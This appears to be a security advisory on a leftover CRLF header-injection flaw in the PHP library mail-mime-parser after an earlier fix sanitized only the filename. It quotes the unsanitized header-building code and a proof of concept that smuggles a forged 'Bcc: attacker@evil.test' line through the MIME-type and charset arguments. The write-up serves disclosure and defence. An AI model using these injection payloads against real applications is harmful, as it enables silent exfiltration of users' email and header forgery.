---
title: "mail-mime-parser: CVE-2026-61815's Fix Only Sanitized the Filename"
date: 2026-09-28
target: "zbateson/mail-mime-parser"
severity: High
identifier: "GHSA-gmgm-r6fh-fq6g"
advisory_url: "https://github.com/zbateson/mail-mime-parser/security/advisories/GHSA-gmgm-r6fh-fq6g"
summary: "CVE-2026-61815 was CRLF header injection through an attachment filename; its fix stripped control characters from the filename alone, leaving the other caller-supplied arguments written into the same headers — $mimeType, $encoding, $charset, $micalg, $protocol — still interpolated raw."
---

## Summary

CVE-2026-61815 was a CRLF header-injection bug in `zbateson/mail-mime-parser`,
a widely used PHP MIME parser and builder: an attacker-influenced attachment
**filename** was interpolated straight into the `Content-Type` /
`Content-Disposition` headers of the part being built, so a filename
containing `\r\n` could forge additional header lines.

The fix for it (released in 3.0.6/3.0.7 and 4.0.2) sanitized the filename —
and only the filename. The very same header-building lines interpolate
several other caller-supplied string arguments verbatim. Those arguments —
`$mimeType`, `$encoding`, `$charset`, `$micalg`, `$protocol` — are all
reachable through the ordinary public message-building API, and a `\r\n` in
any of them still injects arbitrary header lines. The original impact
(forged `Bcc:`, header smuggling, MIME-structure confusion) survived the
patch through sibling arguments on the same code.

## Background

The library builds outgoing MIME messages through public methods on
`IMessage`. Several of them take string arguments that get written directly
into part headers:

- `addAttachmentPart()` / `addAttachmentPartFromFile()` — `$mimeType`, `$encoding`
- `setTextPart()` / `setHtmlPart()` — `$charset`
- `setAsMultipartSigned()` — `$micalg`, `$protocol`

Header assembly happens in `MultipartHelper`, which composes the header value
as a PHP interpolated string and hands it to `setRawHeader()` — a "raw"
setter that stores the line as given, without re-encoding it.

## The vulnerability

CVE-2026-61815's fix added a control-character filter, but scoped it to the
filename. The sanitized value is `$safe`; everything else on the same lines
is written raw:

```php
// filename is run through a control-character filter -> $safe
$converted = \iconv('UTF-8', 'US-ASCII//translit//ignore', $filename);
$safe = \preg_replace('/[\x00-\x1F\x7F]+/', ' ', ($converted !== false) ? $converted : '') ?? '';

// ...but $mimeType / $charset / $encoding are interpolated verbatim:
$part->setRawHeader(HeaderConsts::CONTENT_TYPE, "$mimeType;\r\n\tname=\"$safe\"");
$mimePart->setRawHeader(HeaderConsts::CONTENT_TYPE, "$mimeType;\r\n\tcharset=\"$charset\"");
$part->setRawHeader(HeaderConsts::CONTENT_TRANSFER_ENCODING, $encoding);
$part->setRawHeader(HeaderConsts::CONTENT_TYPE, "$contentType;\r\n\tcharset=\"$charset\"");
```

The signing path has the same shape, with two more raw arguments:

```php
$message->setRawHeader(HeaderConsts::CONTENT_TYPE,
    "multipart/signed;\r\n\tboundary=\"$boundary\";\r\n\tmicalg=\"$micalg\"; protocol=\"$protocol\"");
```

Only `$safe` passes through the filter. A `\r\n` inside `$mimeType`,
`$charset`, `$encoding`, `$micalg` or `$protocol` becomes a real header
break in the serialized output. This is the classic "sanitize the reported
instance, not the sink" gap — the fix cleaned the one value named in the
report rather than the header-write chokepoint, so the same bug remained
one argument over.

## Proof of concept

Against the then-current `4.0.5` (newer than the patched `4.0.2`), using only
the public API:

```php
require 'vendor/autoload.php';
use ZBateson\MailMimeParser\Message;

// [1] inject through $mimeType
$m = Message::newInstance();
$m->addAttachmentPart(
    'payload',
    "application/octet-stream\r\nBcc: attacker@evil.test",  // $mimeType
    'safe.txt'
);

// [2] inject through $charset
$m->setTextPart('hello', "utf-8\"\r\nBcc: attacker@evil.test");
```

The attachment part from case [1] serializes with the forged line spliced in
between the legitimate headers:

```
Content-Transfer-Encoding: base64
Content-Type: application/octet-stream
Bcc: attacker@evil.test;
	name="safe.txt"
Content-Disposition: attachment;
	filename="safe.txt"
```

A clean value serializes with no injected line, and the *filename* argument —
the one the earlier fix addressed — is correctly sanitized, confirming this
is a genuine remaining gap in the same fix rather than a regression.

## Impact

Identical to the parent advisory, which scoped it as any application using the
library to build or forward MIME messages with an attacker-influenced value.
These arguments are routinely attacker-influenced in practice: an
attachment's MIME type is very often taken from an uploaded file's
browser-supplied `Content-Type`, and `$charset` / `$encoding` can be driven by
user input just as easily. A crafted value injects arbitrary MIME headers — a
forged `Bcc:` that silently exfiltrates the outgoing message, header
smuggling, or MIME-structure confusion — with no privileges and no user
interaction. CVSS 3.1 `AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N` = 7.2 (High).

## The fix

Versions **3.0.9** and **4.0.6** replace control characters with spaces in
*all* of the affected arguments before the header is built, matching the
treatment already applied to the filename — moving the neutralization to
cover every caller-supplied value that reaches those raw header lines.

## Timeline

- 2026-09-28 — Reported to the maintainer (private advisory)
- 2026-09-28 — Fixed in 3.0.9 and 4.0.6
- 2026-09-28 — Advisory GHSA-gmgm-r6fh-fq6g published

## Disclosure

Public advisory:
[GHSA-gmgm-r6fh-fq6g](https://github.com/zbateson/mail-mime-parser/security/advisories/GHSA-gmgm-r6fh-fq6g).
Parent issue: [CVE-2026-61815 / GHSA-36h5-qg4p-q2qf](https://github.com/advisories/GHSA-36h5-qg4p-q2qf).
